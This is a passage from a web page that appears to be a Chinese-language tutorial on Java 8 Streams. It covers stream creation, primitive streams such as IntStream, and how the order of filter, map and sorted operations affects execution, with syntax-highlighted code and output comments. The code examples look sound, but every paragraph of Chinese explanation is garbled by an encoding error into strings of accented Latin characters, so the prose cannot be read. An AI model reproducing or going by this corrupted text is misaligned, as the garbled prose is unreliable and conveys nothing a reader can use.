post-story"><p>å¯ä»¥ä»å„ç§æ•°æ®æºåˆ›å»ºæµï¼Œç‰¹åˆ«æ˜¯é›†åˆã€‚åˆ—è¡¨å’Œé›†åˆæ”¯æŒæ–°çš„æ–¹æ³•<code>stream()</code>å’Œ<code>parallelStream()</code>æ¥åˆ›å»ºé¡ºåºæµæˆ–å¹¶è¡Œæµã€‚å¹¶è¡Œæµèƒ½å¤Ÿåœ¨å¤šä¸ªçº¿ç¨‹ä¸Šæ“ä½œï¼Œæœ¬æ•™ç¨‹çš„åé¢ä¸€èŠ‚å°†å¯¹æ­¤è¿›è¡Œä»‹ç»ã€‚æˆ‘ä»¬ç°åœ¨ä¸»è¦å…³æ³¨é¡ºåºæµ:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"a1"</span><span class="token punctuation">,</span> <span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"a3"</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">findFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// a1</span></code></pre><p>åœ¨å¯¹è±¡åˆ—è¡¨ä¸Šè°ƒç”¨æ–¹æ³•<code>stream()</code>å°†è¿”å›ä¸€ä¸ªå¸¸è§„å¯¹è±¡æµã€‚ä½†æˆ‘ä»¬ä¸éœ€è¦åˆ›å»ºé›†åˆæ¥å¤„ç†æµï¼Œå°±åƒæˆ‘ä»¬åœ¨ä¸‹ä¸€ä¸ªä»£ç ç¤ºä¾‹ä¸­çœ‹åˆ°çš„:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"a1"</span><span class="token punctuation">,</span> <span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"a3"</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">findFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// a1</span></code></pre><p>åªéœ€ä½¿ç”¨<code>stream .of()</code>ä»ä¸€å †å¯¹è±¡å¼•ç”¨åˆ›å»ºä¸€ä¸ªæµã€‚</p><p>é™¤äº†å¸¸è§„çš„å¯¹è±¡æµä¹‹å¤–ï¼Œ<code>Java 8</code>è¿˜æä¾›äº†ç‰¹æ®Šç±»å‹çš„æµï¼Œç”¨äºå¤„ç†åŸºæœ¬æ•°æ®ç±»å‹<code>int</code>ã€<code>long</code>å’Œ<code>double</code>ã€‚ä½ å¯èƒ½å·²ç»çŒœåˆ°æ˜¯<code>IntStream</code>, <code>LongStream</code>å’Œ<code>DoubleStream</code>ã€‚</p><p><code>IntStreams</code>å¯ä»¥ä½¿ç”¨<code>IntStream.range()</code>æ›¿æ¢å¸¸è§„çš„<code>forå¾ªç¯</code>:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 1</span><span class="token comment">// 2</span><span class="token comment">// 3</span></code></pre><p>æ‰€æœ‰è¿™äº›åŸºå…ƒæµéƒ½åƒæ™®é€šçš„å¯¹è±¡æµä¸€æ ·å·¥ä½œï¼Œæœ‰ä»¥ä¸‹ä¸åŒ:åŸºå…ƒæµä½¿ç”¨ç‰¹åŒ–çš„l<code>ambdaè¡¨è¾¾å¼</code>ï¼Œä¾‹å¦‚ç”¨<code>IntFunction</code>ä»£æ›¿<code>Function</code>ï¼Œç”¨<code>IntPredicate</code>ä»£æ›¿<code>Predicate</code>ã€‚åŸå§‹æµæ”¯æŒé™„åŠ çš„ç»ˆç«¯èšåˆæ“ä½œ<code>sum()</code>å’Œ<code>average()</code>:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>n <span class="token operator">-></span> <span class="token number">2</span> <span class="token operator">*</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">average</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 5.0</span></code></pre><p>æœ‰æ—¶å°†å¸¸è§„å¯¹è±¡æµè½¬æ¢ä¸ºåŸºæœ¬æµå¾ˆæœ‰ç”¨ï¼Œåä¹‹äº¦ç„¶ã€‚ä¸ºæ­¤ï¼Œå¯¹è±¡æµæ”¯æŒç‰¹æ®Šçš„æ˜ å°„æ“ä½œ<code>mapToInt()</code>ã€<code>mapToLong()</code>å’Œ<code>mapToDouble</code>:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"a1"</span><span class="token punctuation">,</span> <span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"a3"</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>s <span class="token operator">-></span> s<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">mapToInt</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token operator">::</span><span class="token function">parseInt</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 3</span></code></pre><p>åŸå§‹æµå¯ä»¥é€šè¿‡mapToObj()è½¬æ¢ä¸ºå¯¹è±¡æµ:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">mapToObj</span><span class="token punctuation">(</span>i <span class="token operator">-></span> <span class="token string">"a"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// a1</span><span class="token comment">// a2</span><span class="token comment">// a3</span></code></pre><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç»„åˆçš„ä¾‹å­:<code>doubleç±»å‹</code>çš„æµé¦–å…ˆæ˜ å°„åˆ°<code>intç±»å‹</code>çš„æµï¼Œç„¶åå†æ˜ å°„åˆ°<code>stringç±»å‹</code>çš„å¯¹è±¡æµ:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">2.0</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">mapToInt</span><span class="token punctuation">(</span><span class="token class-name">Double</span><span class="token operator">::</span><span class="token function">intValue</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">mapToObj</span><span class="token punctuation">(</span>i <span class="token operator">-></span> <span class="token string">"a"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// a1</span><span class="token comment">// a2</span><span class="token comment">// a3</span></code></pre></div><h2 id="å¤„ç†æ¬¡åº-Processing-Order">å¤„ç†æ¬¡åº(Processing Order)</h2><div class="story post-story"><p>ç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»å­¦ä¹ äº†å¦‚ä½•åˆ›å»ºå’Œä½¿ç”¨ä¸åŒç±»å‹çš„æµï¼Œè®©æˆ‘ä»¬æ·±å…¥äº†è§£å¦‚ä½•åœ¨å¹•åå¤„ç†æµæ“ä½œã€‚ä¸­é—´æ“ä½œçš„ä¸€ä¸ªé‡è¦ç‰¹å¾æ˜¯æƒ°æ€§ã€‚çœ‹çœ‹è¿™ä¸ªä¾‹å­ï¼Œè¿™é‡Œç¼ºå°‘äº†ä¸€ä¸ªç»ˆç«¯æ“ä½œ:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"d2"</span><span class="token punctuation">,</span> <span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"b1"</span><span class="token punctuation">,</span> <span class="token string">"b3"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"filter: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>åœ¨æ‰§è¡Œæ­¤ä»£ç ç‰‡æ®µæ—¶ï¼Œä¸ä¼šå°†ä»»ä½•å†…å®¹æ‰“å°åˆ°æ§åˆ¶å°ã€‚è¿™æ˜¯å› ä¸ºåªæœ‰åœ¨å­˜åœ¨ç»ˆç«¯æ“ä½œæ—¶æ‰ä¼šæ‰§è¡Œä¸­é—´æ“ä½œã€‚</p><p>è®©æˆ‘ä»¬é€šè¿‡ç»ˆç«¯æ“ä½œforEachæ¥æ‰©å±•ä¸Šé¢çš„ç¤ºä¾‹:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"d2"</span><span class="token punctuation">,</span> <span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"b1"</span><span class="token punctuation">,</span> <span class="token string">"b3"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"filter: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"forEach: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ‰§è¡Œæ­¤ä»£ç ç‰‡æ®µä¼šåœ¨æ§åˆ¶å°ä¸Šäº§ç”Ÿæ‰€éœ€çš„è¾“å‡º:</p><pre class="language-text" data-language="text"><code class="language-text">filter:  d2forEach: d2filter:  a2forEach: a2filter:  b1forEach: b1filter:  b3forEach: b3filter:  cforEach: c</code></pre><p>ç»“æœçš„é¡ºåºå¯èƒ½ä¼šä»¤äººæƒŠè®¶ã€‚ä¸€ç§ç®€å•çš„æ–¹æ³•æ˜¯åœ¨æµçš„æ‰€æœ‰å…ƒç´ ä¸Šä¸€ä¸ªæ¥ä¸€ä¸ªåœ°æ°´å¹³æ‰§è¡Œæ“ä½œ.ä½†æ˜¯æ¯ä¸ªå…ƒç´ éƒ½æ²¿ç€é“¾å‚ç›´ç§»åŠ¨ã€‚ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²<code>â€œd2â€</code>ä¼ é€’<code>filter</code>ç„¶å<code>forEach</code>ï¼Œåªæœ‰è¿™æ ·ç¬¬äºŒä¸ªå­—ç¬¦ä¸²<code>â€œa2â€</code>æ‰ä¼šè¢«å¤„ç†ã€‚</p><p>è¿™ç§è¡Œä¸ºå¯ä»¥å‡å°‘å¯¹æ¯ä¸ªå…ƒç´ æ‰§è¡Œçš„å®é™…æ“ä½œæ•°ï¼Œåœ¨ä¸‹ä¸€ä¸ªä¾‹å­ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"d2"</span><span class="token punctuation">,</span> <span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"b1"</span><span class="token punctuation">,</span> <span class="token string">"b3"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"map: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">anyMatch</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"anyMatch: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// map:      d2</span><span class="token comment">// anyMatch: D2</span><span class="token comment">// map:      a2</span><span class="token comment">// anyMatch: A2</span></code></pre><p>åªè¦è°“è¯åº”ç”¨äºç»™å®šçš„è¾“å…¥å…ƒç´ ï¼Œ<code>anyMatch</code>æ“ä½œå°±è¿”å›<code>true</code>ã€‚å¯¹äºä¼ é€’ç»™<code>â€œA2â€</code>çš„ç¬¬äºŒä¸ªå…ƒç´ æ˜¯è¿™æ ·çš„ã€‚ç”±äºæµé“¾æ˜¯å‚ç›´æ‰§è¡Œçš„ï¼Œæ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹åªéœ€è¦æ‰§è¡Œ<code>ä¸¤æ¬¡map</code>ã€‚å› æ­¤ï¼Œä¸æ˜¯æ˜ å°„æµçš„æ‰€æœ‰å…ƒç´ ï¼Œè€Œæ˜¯å°½å¯èƒ½å°‘åœ°è°ƒç”¨mapã€‚</p><h3 id="Why-order-matters">Why order matters</h3><p>ä¸‹ä¸€ä¸ªç¤ºä¾‹åŒ…å«ä¸¤ä¸ªä¸­é—´æ“ä½œ<code>map</code>å’Œ<code>filter</code>ä»¥åŠç»ˆç«¯æ“ä½œ<code>forEach</code>ã€‚è®©æˆ‘ä»¬å†æ¬¡æ£€æŸ¥è¿™äº›æ“ä½œæ˜¯å¦‚ä½•æ‰§è¡Œçš„:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"d2"</span><span class="token punctuation">,</span> <span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"b1"</span><span class="token punctuation">,</span> <span class="token string">"b3"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"map: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"filter: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"forEach: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// map:     d2</span><span class="token comment">// filter:  D2</span><span class="token comment">// map:     a2</span><span class="token comment">// filter:  A2</span><span class="token comment">// forEach: A2</span><span class="token comment">// map:     b1</span><span class="token comment">// filter:  B1</span><span class="token comment">// map:     b3</span><span class="token comment">// filter:  B3</span><span class="token comment">// map:     c</span><span class="token comment">// filter:  C</span></code></pre><p>æ‚¨å¯èƒ½å·²ç»çŒœåˆ°ï¼Œå¯¹äºåº•å±‚é›†åˆä¸­çš„æ¯ä¸ªå­—ç¬¦ä¸²ï¼Œ<code>map</code>å’Œ<code>filter</code>éƒ½è¢«è°ƒç”¨5æ¬¡ï¼Œè€Œ<code>forEach</code>åªè¢«è°ƒç”¨ä¸€æ¬¡ã€‚</p><p>å¦‚æœæˆ‘ä»¬æ”¹å˜æ“ä½œçš„é¡ºåºï¼Œå°†<code>filter</code>ç§»åˆ°é“¾çš„å¼€å¤´ï¼Œå°±å¯ä»¥å¤§å¤§å‡å°‘å®é™…æ‰§è¡Œçš„æ¬¡æ•°:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"d2"</span><span class="token punctuation">,</span> <span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"b1"</span><span class="token punctuation">,</span> <span class="token string">"b3"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"filter: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"map: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"forEach: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// filter:  d2</span><span class="token comment">// filter:  a2</span><span class="token comment">// map:     a2</span><span class="token comment">// forEach: A2</span><span class="token comment">// filter:  b1</span><span class="token comment">// filter:  b3</span><span class="token comment">// filter:  c</span></code></pre><p>ç°åœ¨ï¼Œ<code>map</code>åªè¢«è°ƒç”¨ä¸€æ¬¡ï¼Œæ‰€ä»¥å¯¹äºå¤§é‡è¾“å…¥å…ƒç´ ï¼Œæ“ä½œç®¡é“çš„æ‰§è¡Œé€Ÿåº¦è¦å¿«å¾—å¤šã€‚åœ¨ç¼–å†™å¤æ‚çš„æ–¹æ³•é“¾æ—¶ï¼Œè¯·è®°ä½è¿™ä¸€ç‚¹ã€‚</p><p>è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªé¢å¤–çš„æ“ä½œæ¥æ‰©å±•ä¸Šé¢çš„ä¾‹å­ï¼Œ<code>sorted</code>:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"d2"</span><span class="token punctuation">,</span> <span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"b1"</span><span class="token punctuation">,</span> <span class="token string">"b3"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">sorted</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sort: %s; %s\n"</span><span class="token punctuation">,</span> s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s1<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"filter: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"map: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"forEach: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ’åºæ˜¯ä¸€ç§ç‰¹æ®Šçš„ä¸­é—´æ“ä½œã€‚è¿™æ˜¯ä¸€ä¸ªæ‰€è°“çš„æœ‰çŠ¶æ€æ“ä½œï¼Œå› ä¸ºä¸ºäº†å¯¹å…ƒç´ é›†åˆæ’åºï¼Œæ‚¨å¿…é¡»åœ¨æ’åºæœŸé—´ä¿æŒçŠ¶æ€ã€‚</p><p>æ‰§è¡Œè¿™ä¸ªç¤ºä¾‹ä¼šå¾—åˆ°ä»¥ä¸‹æ§åˆ¶å°è¾“å‡º:</p><pre class="language-text" data-language="text"><code class="language-text">sort:    a2; d2sort:    b1; a2sort:    b1; d2sort:    b1; a2sort:    b3; b1sort:    b3; d2sort:    c; b3sort:    c; d2filter:  a2map:     a2forEach: A2filter:  b1filter:  b3filter:  cfilter:  d2</code></pre><p>é¦–å…ˆï¼Œå¯¹æ•´ä¸ªè¾“å…¥é›†åˆæ‰§è¡Œæ’åºæ“ä½œã€‚æ¢å¥è¯è¯´ï¼Œ<code>æ’åº</code>æ˜¯æ°´å¹³æ‰§è¡Œçš„ã€‚æ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯¹äºè¾“å…¥é›†åˆä¸­çš„æ¯ä¸ªå…ƒç´ çš„å¤šä¸ªç»„åˆï¼Œsortedè¢«è°ƒç”¨8æ¬¡ã€‚</p><p>å†ä¸€æ¬¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é‡æ–°æ’åºé“¾æ¥ä¼˜åŒ–æ€§èƒ½:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"d2"</span><span class="token punctuation">,</span> <span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"b1"</span><span class="token punctuation">,</span> <span class="token string">"b3"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"filter: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">sorted</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sort: %s; %s\n"</span><span class="token punctuation">,</span> s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s1<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token punctuation">&#123;</span>        